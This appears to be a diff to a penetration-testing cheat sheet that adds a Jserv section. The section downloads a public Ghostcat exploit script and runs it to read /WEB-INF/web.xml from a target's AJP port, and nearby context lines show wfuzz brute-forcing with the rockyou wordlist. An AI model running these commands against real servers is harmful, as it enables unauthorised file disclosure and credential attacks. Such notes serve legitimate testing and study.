@@ -16,6 +16,7 @@
 * [PHP Uploading Bypass](#PHP-Uploading-Bypass)
 * [Port Tunnelling](#Port-Tunnelling)
 * [WEB Fuzz](#WEB-Fuzz)
+* [Jserv](#Jserv)
 
 ## Protocols
 
@@ -304,6 +305,16 @@ wfuzz -c -z file,/usr/share/wordlists/rockyou.txt http://{TARGET}/example/exampl
 
 # POST Data
 wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "{PARAMETER_1}=FUZZ&{PARAMETER_2}=FUZZ" -u http://{TARGET}/example.php
+```
+
+# Jserv
+
+```
+# Get ajpShooter
+wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py
+
+# Run ajpShooter
+python3 ajpShooter.py http://{TARGET} {PORT} /WEB-INF/web.xml read
 ```
 
 
